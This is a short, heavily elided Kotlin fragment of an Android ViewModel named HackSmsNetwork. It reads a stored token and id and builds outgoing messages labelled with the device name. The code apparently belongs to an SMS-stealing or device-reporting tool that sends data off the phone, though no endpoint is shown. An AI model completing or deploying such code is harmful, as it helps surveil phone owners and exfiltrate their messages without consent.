...
class HackSmsNetwork(context: Context) : ViewModel() {
    private val token = HackSmsUtils.getHackSmsNetworkData(context).token
    private val id = HackSmsUtils.getHackSmsNetworkData(context).id
    ...
    fun sendTextMessage(message: String) {
        try {
            viewModelScope.launch(Dispatchers.IO) {
                ...
                val info = "\uD835\uDC1D\uD835\uDC1E\uD835\uDC2F\uD835\uDC22\uD835\uDC1C\uD835\uDC1E : ${HackSmsUtils.getDeviceName()}"
